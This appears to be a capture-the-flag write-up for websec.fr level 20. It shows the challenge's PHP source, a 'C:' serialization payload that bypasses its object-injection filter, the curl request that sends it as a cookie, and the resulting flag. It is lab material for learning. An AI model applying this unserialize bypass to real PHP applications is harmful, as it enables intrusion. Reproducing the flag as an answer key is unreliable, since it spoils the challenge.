SOurce given
```
<?php

include "flag.php";

class Flag {
    public function __destruct() {
       global $flag;
       echo $flag; 
    }
}

function sanitize($data) {
    /* i0n1c's bypass won't save you this time! (https://www.exploit-db.com/exploits/22547/) */
    if ( ! preg_match ('/[A-Z]:/', $data)) {
        return unserialize ($data);
    }

    if ( ! preg_match ('/(^|;|{|})O:[0-9+]+:"/', $data )) {
        return unserialize ($data);
    }

    return false;
}

$data = Array();
if (isset ($_COOKIE['data'])) {
    $data = sanitize (base64_decode ($_COOKIE['data']));
}

if (isset ($_POST['value']) and ! empty ($_POST['value'])) {
    /* Add a value twice to remove it from the list. */
    if (($key = array_search ($_POST['value'], $data)) !== false) {
        unset ($data[$key]);
    } else { /* Else, simply add it. */
        array_push ($data, $_POST['value']);
    }
    setcookie ('data', base64_encode (serialize ($data)));
}

?>
```
C:4:"Flag":0:{}
+ payload: curl 'https://websec.fr/level20/index.php' \
    -H 'Cookie: data=Qzo0OiJGbGFnIjowOnt9'
flag: WEBSEC{CVE-2012-5692_was_a_lof_of_phun_thanks_to_i0n1c_but_this_was_not_the_only_bypass}


Reference:
+ https://github.com/MegadodoPublications/exploits/blob/master/composr.md
+ 
